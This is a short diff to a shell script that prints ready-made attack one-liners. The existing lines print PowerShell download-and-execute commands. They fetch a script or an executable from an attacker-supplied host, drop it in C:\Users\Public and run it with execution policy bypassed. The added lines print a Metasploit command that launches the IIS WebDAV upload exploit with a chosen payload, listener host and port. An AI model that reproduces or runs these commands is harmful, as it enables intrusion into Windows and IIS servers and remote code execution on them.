@@ -11,6 +11,8 @@ printf "echo $wc=New-Object Net.WebClient>w.ps1 && echo $u=\"http://$1/$3\">>w.p
 printf "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File w.ps1"
 printf "\n\n"
 
+printf "msfconsole -x \"use exploit/windows/iis/iis_webdav_upload_asp;set PAYLOAD $4;set LHOST $1;set LPORT $2\""
+printf "\n\n"
 
 printf "$wc = New-Object System.Net.WebClient;$wc.DownloadFile(http://$1:$2, \"C:\Users\Public\");Start-Process -Filepath \"C:\Users\Public\my.exe\""
 printf "\n\n"
